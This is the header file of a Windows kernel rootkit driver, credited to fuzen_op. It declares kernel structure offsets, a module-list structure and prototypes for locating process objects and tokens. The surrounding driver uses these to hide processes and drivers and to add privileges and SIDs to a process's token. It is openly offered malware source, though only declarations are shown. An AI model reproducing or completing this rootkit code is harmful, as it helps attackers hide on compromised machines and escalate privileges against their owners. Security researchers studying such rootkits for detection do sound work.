///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.h
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: Defines globals, function prototypes, etc. used by rootkit.c.
//
// Date:    5/27/2003
// Version: 1.0

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;

#define PROCNAMEIDLEN 26 
#define MAX_SID_SIZE 72

int FLINKOFFSET;   
int PIDOFFSET;     
int AUTHIDOFFSET;
int TOKENOFFSET;
int PRIVCOUNTOFFSET;
int PRIVADDROFFSET;
int SIDCOUNTOFFSET;
int SIDADDROFFSET;

typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	DWORD  unknown[4];
	DWORD  base;
	DWORD  driver_start;
	DWORD  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
	//...
} MODULE_ENTRY, *PMODULE_ENTRY;

PMODULE_ENTRY gul_PsLoadedModuleList;  // We are going to set this to point to PsLoadedModuleList.
//__declspec(dllimport) MODULE_ENTRY PsLoadedModuleList; // Unfortunitely not exported


typedef struct _vars {
	int the_PID;
	PLUID_AND_ATTRIBUTES pluida;
	int num_luids;
} VARS;


typedef struct _vars2 {
	int the_PID;
	void *pSID;
	int i_SidSize;
} VARS2;

// I found these defined in a .h file, but if these Session ID's do
// not exist on your box, the machine will BlueScreen because it 
// dereferenced an unknown Session ID.
#define SYSTEM_LUID                    0x000003e7; // { 0x3E7, 0x0 }
#define ANONYMOUS_LOGON_LUID           0x000003e6; // { 0x3e6, 0x0 }
#define LOCALSERVICE_LUID              0x000003e5; // { 0x3e5, 0x0 }
#define NETWORKSERVICE_LUID            0x000003e4; // { 0x3e4, 0x0 }

typedef struct _SID_AND_ATTRIBUTES {
    PSID Sid;
    DWORD Attributes;
} SID_AND_ATTRIBUTES, * PSID_AND_ATTRIBUTES;

#define SE_PRIVILEGE_DISABLED            (0x00000000L)

PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

DWORD Non2000FindPsLoadedModuleList(void);
DWORD FindPsLoadedModuleList(IN PDRIVER_OBJECT);
DWORD FindProcessToken(DWORD);
DWORD FindProcessEPROC(int);

NTSTATUS RootkitDispatch(IN PDEVICE_OBJECT, IN PIRP);
void RootkitUnload(IN PDRIVER_OBJECT);
NTSTATUS RootkitDeviceControl(IN PFILE_OBJECT, IN BOOLEAN, IN PVOID, 
							IN ULONG, OUT PVOID, IN ULONG, IN ULONG, 
							OUT PIO_STATUS_BLOCK, IN PDEVICE_OBJECT
							);

